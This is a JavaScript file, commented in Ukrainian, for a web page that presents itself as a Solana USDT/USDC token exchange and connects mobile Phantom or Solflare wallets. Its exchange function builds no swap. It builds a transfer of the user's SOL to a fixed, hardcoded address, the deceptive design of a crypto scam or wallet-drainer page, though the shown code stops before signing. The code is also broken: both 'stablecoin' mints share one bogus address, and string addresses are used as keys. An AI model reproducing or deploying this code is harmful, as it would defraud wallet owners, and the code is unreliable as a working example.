const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;

// Solana RPC
const endpoint = "https://api.mainnet-beta.solana.com";
const connection = new Connection(endpoint, "confirmed");

// Адреса гаманців
const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

// UI Елементи
const connectWalletBtn = document.getElementById("connectWalletBtn");
const walletStatus = document.getElementById("walletStatus");
const exchangeBtn = document.getElementById("exchangeBtn");
const resultDiv = document.getElementById("result");
const amountInput = document.getElementById("amount");
const walletPopup = document.getElementById("walletPopup");

const SOLANA_WALLETS = {
    phantom: {
        connect: `https://phantom.app/ul/v1/connect?app_url=https://cool-kataifi-90a5d5.netlify.app&redirect_link=`,
    },
    solflare: {
        connect: `https://solflare.com/connect?redirect=`,
    }
};

// Функція для визначення мобільного пристрою
function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// Отримання диплінку
function getDeepLink(wallet) {
    if (!SOLANA_WALLETS[wallet]) return null;
    return SOLANA_WALLETS[wallet].connect + encodeURIComponent(window.location.href);
}

// Функція для підключення гаманця через диплінк
function connectWallet(wallet) {
    if (!isMobile()) {
        alert("Будь ласка, відкрийте це на мобільному пристрої.");
        return;
    }
    const deepLink = getDeepLink(wallet);
    if (deepLink) {
        window.location.href = deepLink;
    } else {
        alert("Обраний гаманець не підтримується.");
    }
}

// Отримання адреси гаманця після повернення з мобільного гаманця
function getWalletAddressFromUrl() {
    const params = new URLSearchParams(window.location.search);
    const walletAddress = params.get("wallet");
    if (walletAddress) {
        walletStatus.textContent = `Гаманець підключено: ${walletAddress}`;
    }
}

window.onload = getWalletAddressFromUrl;

document.getElementById("connectPhantom").addEventListener("click", () => {
    connectWallet("phantom");
});

document.getElementById("connectSolflare").addEventListener("click", () => {
    connectWallet("solflare");
});

// Перевірка балансу перед обміном
async function getTokenBalance(ownerAddress, mintAddress) {
    try {
        const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
        if (response.value.length > 0) {
            return parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount);
        }
        return 0;
    } catch (error) {
        console.error("Помилка отримання балансу:", error);
        return 0;
    }
}

// Обмін токенів
exchangeBtn.addEventListener("click", async () => {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        alert("Будь ласка, введіть коректну кількість USDT/USDC");
        return;
    }

    const params = new URLSearchParams(window.location.search);
    const walletAddress = params.get("wallet");

    if (!walletAddress) {
        alert("Будь ласка, підключіть гаманець");
        return;
    }

    const balanceUSDT = await getTokenBalance(walletAddress, USDT_MINT_ADDRESS);
    const balanceUSDC = await getTokenBalance(walletAddress, USDC_MINT_ADDRESS);

    if (balanceUSDT < amount && balanceUSDC < amount) {
        alert("Недостатньо коштів для обміну!");
        return;
    }

    await exchangeTokens(walletAddress, amount);
});

// Функція для обміну USDT/USDC
async function exchangeTokens(walletAddress, amountInUSDT) {
    try {
        const transaction = new Transaction();
        const sender = new PublicKey(walletAddress);

        const hasUSDT = await getTokenBalance(sender, USDT_MINT_ADDRESS) >= amountInUSDT;
        const mintAddress = hasUSDT ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;

        const transferInstruction = SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: SPL_TOKEN_ADDRESS,
            lamports: amountInUSDT * 1000000000
        });

        transaction.add(transferInstruction);

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = sender;

        console.log(`Транзакція готова до підпису, відправте її у ваш гаманець.`);
    } catch (err) {
        console.error("Помилка обміну:", err);
        resultDiv.style.display = "block";
        resultDiv.textContent = "Помилка при обміні. Спробуйте ще раз.";
    }
}
